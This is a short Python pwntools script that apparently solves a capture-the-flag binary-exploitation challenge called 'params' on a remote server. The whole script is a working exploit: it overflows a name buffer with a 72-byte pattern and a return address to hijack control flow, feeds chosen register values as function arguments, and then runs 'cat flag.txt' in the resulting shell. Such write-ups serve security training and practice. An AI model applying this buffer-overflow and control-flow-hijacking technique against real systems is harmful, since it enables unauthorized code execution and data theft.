#!/bin/python
from pwn import *

#target = process("./params")
target = remote("forever.isss.io", 1304)

print(target.recvline()) # hey bb
print(target.recvline()) # whats ur name

target.sendline(cyclic(72)+p64(0x00401354)) # jump to 0x0000000000401354

print(target.recvline()) # hello $NAME
print(target.recvline()) # you can set my registers any day of the week

# arbitrery
target.sendline( b'0' ) # rax 
target.sendline( b'0' ) # rbx

# rcx, rdx, rsi, rdi | get_flag arguments 
target.sendline(str(4)) # rcx
target.sendline(str(0xdeadbeef)) # rdx
target.sendline(str(0xcafebabe)) # rsi
target.sendline(str(0x1337)) # rdi

# house cleaning
target.recvuntil("rbx:")

# get flag
target.sendline(b"cat flag.txt")
print(target.recvline())
